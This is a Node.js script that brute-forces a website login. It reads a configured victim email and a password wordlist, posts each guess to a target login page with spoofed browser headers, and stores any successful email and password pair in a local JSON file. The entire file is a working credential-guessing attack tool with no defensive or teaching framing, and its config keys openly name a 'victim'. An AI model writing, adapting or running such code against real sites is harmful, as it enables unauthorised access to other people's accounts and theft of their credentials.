const fs = require('fs');
const path = require('path');
const settings = JSON.parse(fs.readFileSync('config.json'))
console.log(settings)

if (!settings.VictimsEmail || !settings.PasswordsFile || !settings.CredientalsStorage || !settings.SubmitPage || !settings.referr){
    throw new Error("Invalid Configuration!")
}

const storeData = (data)=>{
    try {
        const FileData = JSON.parse(fs.readFileSync(path.join(__dirname, 'matchs.json'), 'utf8'));
        FileData.push(data)
        fs.writeFileSync(path.join(__dirname, 'matchs.json'), JSON.stringify(FileData), 'utf8')
    } catch (error) {
        console.log(error.message)   
    }
}


const GetAllPasswords = (filePath) => {
    console.log("Fetching Passwords...")
    const data = fs.readFileSync(filePath, 'utf8').toString() // Fetching Passwords

    console.log("Encoding Passwords...")
    const EncodedData = encodeURIComponent(data) // Encoding Passwords

    console.log("Spliting Passwords...")
    const ParsedPasswords = EncodedData.split('%0A') // Splitting Them by new Lines
    console.log("Loading Passwords...")
    return ParsedPasswords
}
const attack = async (email, password) => {
    const options = {
        "credentials": "include",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "content-type": "application/x-www-form-urlencoded",
            "Sec-GPC": "1"
        },
        "referrer": settings.referr,
        "body": `email=${encodeURIComponent(email)}&password=${password}`,
        "method": "POST",
        "mode": "cors"
    }

    const AttackRequest = await fetch(settings.SubmitPage, options);
    const AttackResponse = await AttackRequest.text();

    if (AttackResponse === "The User Doesn't exist!") {

        console.log(AttackResponse)
        throw new Error(AttackResponse)
        return false

    } else if (AttackResponse === "Internal Server Error!") {

        console.log(AttackResponse)
        throw new Error(AttackResponse)
        return false

    } else if (AttackResponse === "Incorrect Password!") {

        return false

    } else if (AttackResponse === "Internal Server Error While Comparing Passwords!") {

        console.log(AttackResponse)
        throw new Error(AttackResponse)
        return false

    } else if (AttackResponse === "Successful Login!") {

        const credentials = {email: email, password: password};
        storeData(credentials)
        console.log(`Match Found:\nEmail: ${email}\nPassword: ${password}\nstored in 'match.json'`)
        console.timeEnd("Timer")
        
        return true
    }
}

const Passwords = GetAllPasswords(settings.PasswordsFile);
console.log("Loaded All Passwords!")
const count = Passwords.length;

(async () => {
    console.log("Attacking please wait...")
    console.time("Timer");
    let isFoundPassword = false
    for (let i = 0; i < count; i++) {
        console.log("Checking: ",Passwords[i])
        if (await attack(settings.VictimsEmail, Passwords[i])) {
            isFoundPassword = true;
            break
        }
    }
    if (!isFoundPassword){
        console.log("No Match Found!")
    }
    console.log("Exiting in 10s...")
    setTimeout(() => {

    }, 10*1000);

})();